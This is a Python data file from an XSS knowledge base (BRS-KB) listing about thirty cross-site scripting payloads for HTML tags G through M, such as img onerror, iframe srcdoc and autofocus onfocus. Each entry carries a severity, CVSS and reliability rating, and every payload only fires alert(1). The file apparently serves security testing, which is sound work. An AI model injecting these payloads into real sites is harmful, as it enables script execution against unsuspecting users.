#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

HTML Tag XSS Payloads - Basic Tags G-M
"""

from ..models import PayloadEntry


HTML_TAG_PAYLOADS_GM = {
    # Form tag
    "tag_form_1": PayloadEntry(
        payload="<form onsubmit=alert(1)><input type=submit></form>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Form with onsubmit",
        tags=["html", "form", "onsubmit"],
        reliability="high",
    ),
    "tag_form_2": PayloadEntry(
        payload="<form action=javascript:alert(1)><input type=submit></form>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Form with javascript action",
        tags=["html", "form", "action"],
        reliability="high",
    ),
    # H1-H6 tags
    "tag_h1": PayloadEntry(
        payload="<h1 onclick=alert(1)>Header</h1>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="H1 with onclick",
        tags=["html", "h1", "onclick"],
        reliability="high",
    ),
    # Header tag
    "tag_header": PayloadEntry(
        payload="<header onclick=alert(1)>Header</header>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Header with onclick",
        tags=["html", "header", "onclick", "html5"],
        reliability="high",
    ),
    # Hr tag
    "tag_hr": PayloadEntry(
        payload="<hr onclick=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Hr with onclick",
        tags=["html", "hr", "onclick"],
        reliability="high",
    ),
    # I tag
    "tag_i": PayloadEntry(
        payload="<i onclick=alert(1)>Italic</i>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="I with onclick",
        tags=["html", "i", "onclick"],
        reliability="high",
    ),
    # Iframe tag
    "tag_iframe_1": PayloadEntry(
        payload="<iframe src=javascript:alert(1)>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Iframe with javascript src",
        tags=["html", "iframe", "javascript"],
        reliability="medium",
    ),
    "tag_iframe_2": PayloadEntry(
        payload="<iframe onload=alert(1) src=about:blank>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Iframe with onload",
        tags=["html", "iframe", "onload"],
        reliability="high",
    ),
    "tag_iframe_3": PayloadEntry(
        payload="<iframe srcdoc='<script>alert(1)</script>'>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Iframe with srcdoc",
        tags=["html", "iframe", "srcdoc", "html5"],
        reliability="high",
    ),
    # Img tag
    "tag_img_1": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Img with onerror",
        tags=["html", "img", "onerror"],
        reliability="high",
    ),
    "tag_img_2": PayloadEntry(
        payload="<img src=valid.jpg onload=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Img with onload",
        tags=["html", "img", "onload"],
        reliability="high",
    ),
    "tag_img_3": PayloadEntry(
        payload="<img src=x onmouseover=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Img with onmouseover",
        tags=["html", "img", "onmouseover"],
        reliability="high",
    ),
    # Input tag
    "tag_input_1": PayloadEntry(
        payload="<input onfocus=alert(1) autofocus>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Input with autofocus onfocus",
        tags=["html", "input", "autofocus", "onfocus"],
        reliability="high",
    ),
    "tag_input_2": PayloadEntry(
        payload="<input onblur=alert(1) autofocus><input autofocus>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Input with onblur",
        tags=["html", "input", "onblur"],
        reliability="high",
    ),
    "tag_input_3": PayloadEntry(
        payload="<input oninput=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Input with oninput",
        tags=["html", "input", "oninput"],
        reliability="high",
    ),
    "tag_input_4": PayloadEntry(
        payload="<input type=image src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Input image with onerror",
        tags=["html", "input", "image", "onerror"],
        reliability="high",
    ),
    # Ins tag
    "tag_ins": PayloadEntry(
        payload="<ins onclick=alert(1)>Inserted</ins>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Ins with onclick",
        tags=["html", "ins", "onclick"],
        reliability="high",
    ),
    # Kbd tag
    "tag_kbd": PayloadEntry(
        payload="<kbd onclick=alert(1)>Keyboard</kbd>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Kbd with onclick",
        tags=["html", "kbd", "onclick"],
        reliability="high",
    ),
    # Label tag
    "tag_label": PayloadEntry(
        payload="<label onclick=alert(1)>Label</label>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Label with onclick",
        tags=["html", "label", "onclick"],
        reliability="high",
    ),
    # Legend tag
    "tag_legend": PayloadEntry(
        payload="<fieldset><legend onclick=alert(1)>Legend</legend></fieldset>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Legend with onclick",
        tags=["html", "legend", "onclick"],
        reliability="high",
    ),
    # Li tag
    "tag_li": PayloadEntry(
        payload="<ul><li onclick=alert(1)>Item</li></ul>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Li with onclick",
        tags=["html", "li", "onclick"],
        reliability="high",
    ),
    # Link tag
    "tag_link": PayloadEntry(
        payload="<link rel=stylesheet href=javascript:alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Link with javascript href (limited)",
        tags=["html", "link", "javascript"],
        reliability="low",
    ),
    # Main tag
    "tag_main": PayloadEntry(
        payload="<main onclick=alert(1)>Main</main>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Main with onclick",
        tags=["html", "main", "onclick", "html5"],
        reliability="high",
    ),
    # Map tag
    "tag_map": PayloadEntry(
        payload="<map name=x onclick=alert(1)><area></map><img usemap=#x src=x>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Map with onclick",
        tags=["html", "map", "onclick"],
        reliability="medium",
    ),
    # Mark tag
    "tag_mark": PayloadEntry(
        payload="<mark onclick=alert(1)>Marked</mark>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Mark with onclick",
        tags=["html", "mark", "onclick", "html5"],
        reliability="high",
    ),
    # Marquee tag
    "tag_marquee_1": PayloadEntry(
        payload="<marquee onstart=alert(1)>XSS</marquee>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Marquee with onstart",
        tags=["html", "marquee", "onstart", "deprecated"],
        reliability="medium",
    ),
    "tag_marquee_2": PayloadEntry(
        payload="<marquee onfinish=alert(1) loop=1>XSS</marquee>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Marquee with onfinish",
        tags=["html", "marquee", "onfinish", "deprecated"],
        reliability="medium",
    ),
    "tag_marquee_3": PayloadEntry(
        payload="<marquee onbounce=alert(1) behavior=alternate>XSS</marquee>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Marquee with onbounce",
        tags=["html", "marquee", "onbounce", "deprecated"],
        reliability="medium",
    ),
    # Menu tag
    "tag_menu": PayloadEntry(
        payload="<menu onclick=alert(1)><li>Item</li></menu>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Menu with onclick",
        tags=["html", "menu", "onclick"],
        reliability="high",
    ),
    # Meter tag
    "tag_meter": PayloadEntry(
        payload="<meter onclick=alert(1)>50%</meter>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Meter with onclick",
        tags=["html", "meter", "onclick", "html5"],
        reliability="high",
    ),
    # Nav tag
}
